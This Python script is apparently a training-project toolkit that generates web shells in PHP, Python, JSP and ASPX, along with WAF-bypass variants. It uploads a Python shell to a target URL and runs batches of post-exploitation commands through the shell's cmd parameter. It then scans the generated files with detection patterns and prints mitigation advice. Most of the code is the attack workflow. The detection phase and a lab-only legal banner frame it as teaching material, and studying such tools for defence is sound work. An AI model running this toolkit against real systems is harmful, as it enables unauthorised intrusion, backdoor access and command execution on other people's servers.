#!/usr/bin/env python3
"""
Web Shell Development & Detection Toolkit
Project #29: Web Shell & Backdoor Development

LEGAL: Only test DVWA, bWAPP, PortSwigger labs, or your own apps.
"""

import sys
import os
import re
import json
import time
import base64
import hashlib
import argparse
import datetime
import urllib3
from urllib.parse import urlparse

import requests

from webshell_payloads import (
    PHP_SHELLS, PYTHON_SHELLS, JSP_SHELLS, ASPX_SHELLS,
    WAF_BYPASS_VARIANTS, DETECTION_PATTERNS, KNOWN_SHELL_HASHES,
    POST_EXPLOIT_COMMANDS, reverse_shell_bash, reverse_shell_python,
    reverse_shell_php, PERSISTENCE_METHODS,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    MAGENTA = '\033[95m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'

# ---------------------------------------------------------------------- #
class WebShellToolkit:
    def __init__(self, target=None, output_dir='.',
                 timeout=10, delay=0.3, verbose=False):
        self.target = target
        self.timeout = timeout
        self.delay = delay
        self.output_dir = output_dir
        self.verbose = verbose

        os.makedirs(f"{output_dir}/webshells", exist_ok=True)
        os.makedirs(f"{output_dir}/detection", exist_ok=True)
        os.makedirs(f"{output_dir}/post_exploit", exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 WebShell Toolkit',
        })

        self.results = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'shells_generated': [],
            'bypass_tests': [],
            'post_exploit': {},
            'detection': {},
            'uploaded_shells': [],
            'error': None,
        }

    # ------------------------------------------------------------------ #
    # PHASE 1: SHELL GENERATION
    # ------------------------------------------------------------------ #
    def phase1_generate(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 1: WEB SHELL GENERATION{Colors.RESET}")

        total = 0
        for lang, shells in [
            ('php', PHP_SHELLS),
            ('python', PYTHON_SHELLS),
            ('jsp', JSP_SHELLS),
            ('aspx', ASPX_SHELLS),
        ]:
            print(f"\n    {Colors.CYAN}[{lang.upper()}]{Colors.RESET} {len(shells)} shells")

            ext = {'php': '.php', 'python': '.py', 'jsp': '.jsp', 'aspx': '.aspx'}[lang]

            for name, content in shells.items():
                filename = f"{lang}_{name}{ext}"
                path = f"{self.output_dir}/webshells/{filename}"

                with open(path, 'w', encoding='utf-8') as f:
                    f.write(content)

                size = len(content)
                print(f"      {Colors.GREEN}✓{Colors.RESET} {filename} ({size} bytes)")

                self.results['shells_generated'].append({
                    'language': lang, 'name': name,
                    'filename': filename, 'size': size
                })
                total += 1

        print(f"\n    {Colors.GREEN}[✓] Total shells generated: {total}{Colors.RESET}")

        # Generate WAF bypass variants of the basic PHP shell
        print(f"\n    {Colors.CYAN}[WAF BYPASS VARIANTS]{Colors.RESET}")
        base_shell = PHP_SHELLS['basic']
        for name, func in WAF_BYPASS_VARIANTS.items():
            try:
                variant = func(base_shell)
                filename = f"php_bypass_{name}.php"
                path = f"{self.output_dir}/webshells/{filename}"
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(variant)
                print(f"      {Colors.GREEN}✓{Colors.RESET} {filename} ({len(variant)} bytes)")
            except Exception as e:
                print(f"      {Colors.RED}✗{Colors.RESET} {name}: {str(e)[:50]}")

    # ------------------------------------------------------------------ #
    # PHASE 2: UPLOAD TESTING
    # ------------------------------------------------------------------ #
    def phase2_upload(self):
        if not self.target:
            print(f"\n{Colors.YELLOW}[!] No target URL — skipping upload phase{Colors.RESET}")
            return

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 2: UPLOAD TESTING{Colors.RESET}")
        print(f"    Target: {self.target}\n")

        # Try uploading a Python shell (since our target app accepts .py)
        shell_content = PYTHON_SHELLS['basic_flask']
        filename = 'uploaded_shell.py'

        try:
            files = {'file': (filename, shell_content, 'text/x-python')}
            r = self.session.post(self.target, files=files,
                                  timeout=self.timeout, verify=False)
            time.sleep(self.delay)

            if r.status_code == 200:
                print(f"      {Colors.GREEN}[+]{Colors.RESET} Upload accepted: {r.text[:100]}")
                self.results['uploaded_shells'].append({
                    'filename': filename, 'status': 200,
                    'response': r.text[:200]
                })
                return r.text
            else:
                print(f"      {Colors.YELLOW}[-]{Colors.RESET} Upload returned HTTP {r.status_code}")
        except Exception as e:
            print(f"      {Colors.RED}[!]{Colors.RESET} {str(e)[:80]}")
        return None

    # ------------------------------------------------------------------ #
    # PHASE 3: POST-EXPLOITATION
    # ------------------------------------------------------------------ #
    def phase3_post_exploit(self):
        if not self.target:
            print(f"\n{Colors.YELLOW}[!] No target URL — skipping post-exploit phase{Colors.RESET}")
            return

        # Derive the shell URL from the target
        # Target: http://localhost:6666/upload  -> shell: http://localhost:6666/shell
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        shell_url = f"{base}/shell"

        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 3: POST-EXPLOITATION{Colors.RESET}")
        print(f"    Shell URL: {shell_url}\n")

        for category, commands in POST_EXPLOIT_COMMANDS.items():
            print(f"    {Colors.CYAN}[{category.upper()}]{Colors.RESET}")
            for cmd in commands:
                try:
                    r = self.session.get(shell_url, params={'cmd': cmd},
                                         timeout=self.timeout, verify=False)
                    time.sleep(self.delay)

                    if r.status_code == 200:
                        # Extract <pre> content
                        m = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                        output = m.group(1).strip() if m else r.text[:200].strip()

                        if output:
                            first_line = output.split('\n')[0][:100]
                            print(f"      {Colors.GREEN}[+]{Colors.RESET} "
                                  f"{cmd}: {first_line}")

                            self.results['post_exploit'].setdefault(category, []).append({
                                'command': cmd, 'output': output[:500]
                            })
                except Exception as e:
                    if self.verbose:
                        print(f"      {Colors.RED}[!]{Colors.RESET} {cmd}: {str(e)[:50]}")

            print()

    # ------------------------------------------------------------------ #
    # PHASE 4: DETECTION
    # ------------------------------------------------------------------ #
    def phase4_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 4: WEB SHELL DETECTION{Colors.RESET}")

        shells_dir = f"{self.output_dir}/webshells"
        detections = []

        print(f"    Scanning {shells_dir} for shells...\n")

        for filename in os.listdir(shells_dir):
            filepath = os.path.join(shells_dir, filename)
            if not os.path.isfile(filepath):
                continue

            try:
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()
            except Exception:
                continue

            findings = self._scan_content(content, filename)
            if findings:
                detections.append({
                    'file': filename,
                    'findings': findings,
                    'risk': self._calc_risk(findings)
                })

                print(f"      {Colors.RED}[!]{Colors.RESET} {filename} — "
                      f"{len(findings)} suspicious pattern(s)")
                for f in findings[:3]:
                    print(f"          • {f['type']}: {f['match'][:60]}")

        self.results['detection'] = {
            'total_scanned': len(os.listdir(shells_dir)),
            'detected': len(detections),
            'details': detections
        }

        # Save detection report
        det_path = f"{self.output_dir}/detection/shell_detection.txt"
        with open(det_path, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("WEB SHELL DETECTION REPORT\n")
            f.write("=" * 70 + "\n\n")
            for d in detections:
                f.write(f"File: {d['file']}\n")
                f.write(f"  Risk: {d['risk']}\n")
                for finding in d['findings']:
                    f.write(f"  [{finding['type']}] {finding['match']}\n")
                f.write("\n")

        print(f"\n    {Colors.GREEN}[✓] Detection report: {det_path}{Colors.RESET}")

    def _scan_content(self, content, filename):
        """Scan content for suspicious patterns."""
        findings = []

        # Determine language from extension
        ext = filename.rsplit('.', 1)[-1].lower()
        lang_patterns = []
        if ext == 'php':
            lang_patterns = ['php_dangerous', 'php_obfuscation',
                             'php_superglobals', 'php_file_ops']
        elif ext == 'py':
            lang_patterns = ['python_dangerous']
        elif ext == 'jsp':
            lang_patterns = ['jsp_dangerous']
        elif ext == 'aspx':
            lang_patterns = ['aspx_dangerous']

        for category in lang_patterns:
            for pattern in DETECTION_PATTERNS.get(category, []):
                for match in re.finditer(pattern, content, re.IGNORECASE):
                    findings.append({
                        'type': category,
                        'match': match.group(0)[:100],
                        'position': match.start()
                    })

        # Also scan the superglobal patterns for any language
        for category in ['php_superglobals']:
            for pattern in DETECTION_PATTERNS.get(category, []):
                for match in re.finditer(pattern, content, re.IGNORECASE):
                    if not any(f['match'] == match.group(0) for f in findings):
                        findings.append({
                            'type': category,
                            'match': match.group(0)[:100],
                            'position': match.start()
                        })

        # Check hash
        content_hash = hashlib.md5(content.encode()).hexdigest()
        for shell_name, shell_hash in KNOWN_SHELL_HASHES.items():
            if shell_hash in content_hash:
                findings.append({
                    'type': 'known_shell_hash',
                    'match': f"matches {shell_name}"
                })

        return findings

    def _calc_risk(self, findings):
        """Calculate risk level."""
        types = set(f['type'] for f in findings)
        if 'php_dangerous' in types or 'python_dangerous' in types:
            return 'CRITICAL'
        if 'php_obfuscation' in types or 'known_shell_hash' in types:
            return 'HIGH'
        if 'php_superglobals' in types or 'php_file_ops' in types:
            return 'MEDIUM'
        return 'LOW'

    # ------------------------------------------------------------------ #
    # REPORTS
    # ------------------------------------------------------------------ #
    def save_reports(self):
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        json_path = f"{self.output_dir}/webshell_report_{ts}.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n{Colors.GREEN}[✓] JSON report: {json_path}{Colors.RESET}")

    def print_summary(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] EXPLOITATION SUMMARY{Colors.RESET}")
        print(f"    Shells generated: {len(self.results['shells_generated'])}")
        print(f"    Uploaded:         {len(self.results['uploaded_shells'])}")
        post_exploit_count = sum(len(v) for v in self.results['post_exploit'].values())
        print(f"    Commands run:     {post_exploit_count}")
        det = self.results.get('detection', {})
        print(f"    Shells detected:  {det.get('detected', 0)} / {det.get('total_scanned', 0)}")

        print(f"\n    {Colors.YELLOW}Mitigation:{Colors.RESET}")
        print(f"        1. File upload validation (extension, MIME, content)")
        print(f"        2. Rename uploaded files (remove .php, .py, .jsp)")
        print(f"        3. Store uploads outside webroot")
        print(f"        4. Disable script execution in uploads")
        print(f"        5. WAF with web shell detection")
        print(f"        6. File integrity monitoring")

    def run(self):
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}Web Shell Development & Detection Toolkit{Colors.RESET}")
        print("=" * 70)

        self.phase1_generate()
        self.phase2_upload()
        self.phase3_post_exploit()
        self.phase4_detection()

        self.print_summary()
        self.save_reports()

def main():
    p = argparse.ArgumentParser(
        description="Web Shell Development & Detection (Project #29)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate shells only
  python webshell_toolkit.py

  # Generate + upload + exploit
  python webshell_toolkit.py --target "http://localhost:6666/upload"

LEGAL: Only test DVWA, bWAPP, PortSwigger labs, or your own apps.
        """
    )
    p.add_argument('--target', help='Upload URL (e.g., http://localhost/upload)')
    p.add_argument('-o', '--output', default='.')
    p.add_argument('--delay', type=float, default=0.3)
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()

    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 70)
    print("  WEB SHELL DEVELOPMENT & DETECTION TOOLKIT")
    print("  Project #29: Web Shell & Backdoor Development")
    print("=" * 70)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  Legal: Only test DVWA, bWAPP, PortSwigger labs, or your own apps.{Colors.RESET}\n")

    toolkit = WebShellToolkit(
        target=args.target,
        output_dir=args.output,
        delay=args.delay,
        verbose=args.verbose,
    )
    toolkit.run()

if __name__ == '__main__':
    main()